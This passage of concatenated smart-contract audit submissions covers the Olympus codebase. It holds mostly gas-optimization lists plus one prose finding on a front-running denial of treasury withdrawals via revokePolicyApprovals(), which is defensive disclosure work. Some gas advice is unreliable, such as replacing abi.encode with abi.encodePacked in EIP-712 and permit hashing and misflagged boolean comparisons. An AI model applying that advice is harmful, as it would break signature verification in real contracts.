testCorrectness_changeObservationFrequency(uint8 nonce) public { ```  ## 12. Use `abi.encodePacked()` instead of `abi.encode()` (41 instances)  `abi.encodePacked()` is more efficient than `abi.encode()`.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::398 => return keccak256(abi.encode(typeHash, nameHash, versionHash, chainID, address(this)));  2022-08-olympus/src/external/OlympusERC20.sol::861 => abi.encode(_PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline)  2022-08-olympus/src/test/lib/larping.sol::18 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::26 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::34 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::43 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::51 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::59 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::68 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::76 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::84 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::93 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::101 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::109 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::118 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::126 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::134 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::143 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::151 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::159 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::168 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::176 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::184 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::193 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::201 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::209 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::218 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::226 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::234 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::243 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::251 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::259 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::268 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::276 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::284 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::293 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::301 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::309 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::318 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::326 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::334 => abi.encode(returned1) ```  ## 13. Use `private` instead of `public` for constants (17 instances)  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.  ```solidity 2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18;  2022-08-olympus/src/modules/RANGE.sol::65 => uint256 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/policies/Governance.sol::121 => uint256 public constant SUBMISSION_REQUIREMENT = 100;  2022-08-olympus/src/policies/Governance.sol::124 => uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  2022-08-olympus/src/policies/Governance.sol::127 => uint256 public constant GRACE_PERIOD = 1 weeks;  2022-08-olympus/src/policies/Governance.sol::130 => uint256 public constant ENDORSEMENT_THRESHOLD = 20;  2022-08-olympus/src/policies/Governance.sol::133 => uint256 public constant EXECUTION_THRESHOLD = 33;  2022-08-olympus/src/policies/Governance.sol::137 => uint256 public constant EXECUTION_TIMELOCK = 3 days;  2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/scripts/Deploy.sol::75 => ERC20 public constant ohm = ERC20(0x0595328847AF962F951a4f8F8eE9A3Bf261e4f6b); // OHM goerli address  2022-08-olympus/src/scripts/Deploy.sol::76 => ERC20 public constant reserve = ERC20(0x41e38e70a36150D08A8c97aEC194321b5eB545A5); // DAI goerli address  2022-08-olympus/src/scripts/Deploy.sol::77 => ERC20 public constant rewardToken = ERC20(0x0Bb7509324cE409F7bbC4b701f932eAca9736AB7); // WETH goerli address  2022-08-olympus/src/scripts/Deploy.sol::80 => IBondAuctioneer public constant bondAuctioneer =  2022-08-olympus/src/scripts/Deploy.sol::82 => IBondAggregator public constant bondAggregator =  2022-08-olympus/src/scripts/Deploy.sol::86 => AggregatorV2V3Interface public constant ohmEthPriceFeed =  2022-08-olympus/src/scripts/Deploy.sol::88 => AggregatorV2V3Interface public constant reserveEthPriceFeed =  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::65 => uint48 public constant FEE_DECIMALS = 1e5; // one percent equals 1000. ```  ## 14. Don't compare boolean expressions to boolean literals (4 instances)  `if (<x> == true)` can be refactored to `if (<x>)`, `if (<x> == false)` can be refactored to `if (!<x>)`.  ```solidity 2022-08-olympus/src/policies/Governance.sol::223 => if (proposalHasBeenActivated[proposalId_] == true) {  2022-08-olympus/src/policies/Governance.sol::306 => if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  2022-08-olympus/src/policies/Operator.sol::351 => if (id_ == RANGE.market(true)) {  2022-08-olympus/src/policies/Operator.sol::355 => if (id_ == RANGE.market(false)) { ```  ## 15. Use custom errors instead of `revert()`/`require()` strings (24 instances)  Using `require()`/`revert()` strings is expensive. Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors.  Custom errors decrease both deploy and runtime gas costs. Note that runtime gas cost is only relevant when the revert condition is met.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::103 => revert("ECDSA: invalid signature");  2022-08-olympus/src/external/OlympusERC20.sol::105 => revert("ECDSA: invalid signature length");  2022-08-olympus/src/external/OlympusERC20.sol::107 => revert("ECDSA: invalid signature 's' value");  2022-08-olympus/src/external/OlympusERC20.sol::109 => revert("ECDSA: invalid signature 'v' value");  2022-08-olympus/src/external/OlympusERC20.sol::571 => require(c >= a, "SafeMath: addition overflow");  2022-08-olympus/src/external/OlympusERC20.sol::597 => require(c / a == b, "SafeMath: multiplication overflow");  2022-08-olympus/src/external/OlympusERC20.sol::769 => require(sender != address(0), "ERC20: transfer from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::770 => require(recipient != address(0), "ERC20: transfer to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::780 => require(account != address(0), "ERC20: mint to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::788 => require(account != address(0), "ERC20: burn from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::802 => require(owner != address(0), "ERC20: approve from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::803 => require(spender != address(0), "ERC20: approve to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::858 => require(block.timestamp <= deadline, "ERC20Permit: expired deadline");  2022-08-olympus/src/external/OlympusERC20.sol::867 => require(signer == owner, "ERC20Permit: invalid signature");  2022-08-olympus/src/libraries/TransferHelper.sol::20 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::32 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::44 => require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::57 => require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::82 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::84 => require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::128 => require(ownersLength == ids.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::188 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::223 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/mocks/Faucet.sol::83 => require(success, "Withdraw Failed"); ```  ## 16. Use shift right/left instead of division/multiplication if possible (9 instances)  A division/multiplication by any number `x` being a power of 2 can be calculated by shifting `log2(x)` to the right/left. While the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ```solidity 2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;  2022-08-olympus/src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;  2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::253 => num1 = num1 - (146097 * num2 + 3) / 4;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::255 => num1 = num1 - (1461 * _year) / 4 + 31;  2022-08-olympus/src/test/policies/BondCallback.t.sol::271 => uint256 minimumPrice = (priceSignificand / 2) *  2022-08-olympus/src/test/policies/Operator.t.sol::869 => uint256 amountIn = auctioneer.maxAmountAccepted(id, guardian) / 2;  2022-08-olympus/src/test/policies/Operator.t.sol::900 => uint256 amountIn = auctioneer.maxAmountAccepted(id, guardian) / 2; ``` 
# INFORMATIONAL SEVERITY ISSUES  **Change Function Visibilities**  **Description:**  Some functions in the contract are designed with a public function without being called internally within the contract. These sets of function with the public visibility costs will cost more call during interaction. The function shares the same name across modules.   The functions are: KEYCODE VERSION  **Remediation:**  For gas optimization, it’s recommended to make these functions external since they were not directly used within the contract. 
1.-Post-increment / post-decrement cost more gas than pre-increment/pre-decrement. Modify the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686   2.- <array>.length should not be looked up in every loop of a for-loop The overheads outlined below are PER LOOP, excluding the first loop. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278   3.- Greater or equal/lower or equal cost more gas than greater/lower. Swich operators  <= / >= for < / > and change to increment / decrement the variable in consecuence: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683  4.- Greater than 0 cost more than !=0. Change the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247  5.- Variable1 += (-=) variable2 cost more gas than variable1 = Variable1 + (-) Variable2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254   6.- instead of using public for constats, use private. It saves gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137   7.-Do not contrast boolean expressions with boolean literals https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306   8.- Use of uints/ints more modest than 32 Bytes (256 pieces) causes above https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33   9.- Present variables with default values are not required https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) [Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)   10.- Multiply/divide by two should use bit shift https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L419 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L420 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427   11.- When you have a function parameter where you just need to read the data use calldate instead of memory. Can save gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L205 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L152 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L45   12.- Use a more recent version of solidity https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/MINTR.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/INSTR.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/VoterRegistration.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/interfaces/IBondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IHeart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L2 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67   # Vulnerability details  ## Impact Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.  ## Proof of Concept The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of "revoking a deactivated policy's approvals". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.   ## Tools Used  IDE (Remix, VSCode)  ## Recommended Mitigation Steps  A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:  As a public variable in Kernel.sol `mapping(address => bool) public isRegisteredPolicy;`  in Kernel.activatePolicy(): `isRegisteredPolicy[address(policy_)] ) = true;`  and finally in TreasuryCustodian.revokePolicyApprovals(): `if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`
[1] ``<ARRAY>.LENGTH`` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A`` FOR``-LOOP  The overheads outlined below are *PER LOOP*, excluding the first loop  -storage arrays incur a Gwarmaccess (100 gas) -memory arrays use MLOAD (3 gas) -calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset.   *There are 5 instances of this issue:*  ``` File : 2022-08-olympus/src/Kernel.sol  306: for (uint256 i; i < depLength; ) {  413: for (uint256 i; i < depcLength; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413)  ``` File :2022-08-olympus/src/policies/TreasuryCustodian.sol  59:   for (uint256 j; j < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59)  ``` File: 2022-08-olympus/src/policies/BondCallback.sol  156:   for (uint256 i; i < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156)  ```  File: 2022-08-olympus/src/policies/Governance.sol  278:  for (uint256 step; step < instructions.length; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  [2] USING  ``PRIVATE`` RATHER THAN ``PUBLIC`` FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  *There are 9 instances of this issue:*  ``` File: 2022-08-olympus/src/modules/RANGE.sol  65:  uint256 public constant FACTOR_SCALE = 1e4;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  ``` File: 2022-08-olympus/src/modules/PRICE.sol  59: uint8 public constant decimals = 18;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  ``` File:2022-08-olympus/src/policies/Operator.sol  89:  uint32 public constant FACTOR_SCALE = 1e4;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)  ``` File: 2022-08-olympus/src/policies/Governance.sol  121:  uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:   uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:   uint256 public constant GRACE_PERIOD = 1 weeks;  130:    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:   uint256 public constant EXECUTION_THRESHOLD = 33;  137:    uint256 public constant EXECUTION_TIMELOCK = 3 days;  ``` 